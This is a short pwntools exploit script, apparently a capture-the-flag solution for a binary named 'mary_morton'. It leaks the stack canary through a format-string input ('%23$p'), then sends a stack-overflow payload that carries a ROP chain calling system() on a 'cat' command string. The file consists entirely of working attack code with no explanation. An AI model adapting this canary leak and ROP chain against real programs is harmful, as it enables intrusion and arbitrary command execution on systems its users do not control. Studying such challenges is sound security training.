from pwn import *

pipe = process("./mary_morton")

system_plt = 0x4006a0
cat_addr = 0x400B2B
pop_rdi_ret = 0x400ab3

def wellcomeMsg():
    print(pipe.recvuntil("3. Exit the battle \n"))


def leakCanary():
    pipe.sendline("2")
    pipe.sendline("%23$p")
    canary = pipe.recvline().decode("utf-8")
    log.info("recv canary: %s" % canary)
    return canary

def stackOverflow(canary):
    payload = "A" * 0x88
    payload += p64(canary)
    payload += "B" * 8
    payload += p64(pop_rdi_ret)
    payload += p64(cat_addr)
    payload += p64(system_plt)

    pipe.sendline("1")
    pipe.sendline(payload)
    log.info(pipe.recvall())


# context.log_level="DEBUG"
wellcomeMsg()
canary = int(leakCanary().encode("utf-8"), 16)
log.info(canary)
stackOverflow(canary)
